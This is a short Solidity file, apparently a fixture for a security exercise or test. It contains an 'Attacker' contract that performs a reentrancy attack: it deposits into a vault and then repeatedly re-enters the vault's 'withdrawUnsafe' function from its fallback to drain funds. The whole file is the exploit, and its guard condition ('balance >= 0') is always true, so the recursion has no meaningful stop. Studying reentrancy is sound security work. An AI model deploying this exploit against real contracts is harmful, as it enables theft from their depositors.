// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;

    function withdrawSafe(address payable holder) external;

    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function depositToVault(address vault) external payable;

    function attack(address vault) external;
}

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        if (address(msg.sender).balance >= 0) {
            IVault(msg.sender).withdrawUnsafe(payable(address(this)));
        }
    }

    function attack(address vault) external {
        IVault(vault).withdrawUnsafe(payable(address(this)));
    }
}
